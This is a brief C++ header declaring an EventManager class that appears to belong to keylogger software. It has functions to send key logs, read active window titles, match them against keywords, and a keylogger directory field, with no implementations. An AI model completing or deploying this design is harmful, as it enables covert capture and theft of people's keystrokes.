#pragma once
#include <vector>
#include <string>

class EventManager
{
public:
	static void Action(std::string wintitle);
	static bool Detect(std::vector<std::string> keywords, std::string wintitle);
	static void SendKeyLogs();
	static std::string getNowTime();
	static std::string GetWindowsText();
	static bool fileExists(const std::string& filename);
	static std::string KeyloggerDirectory;
};

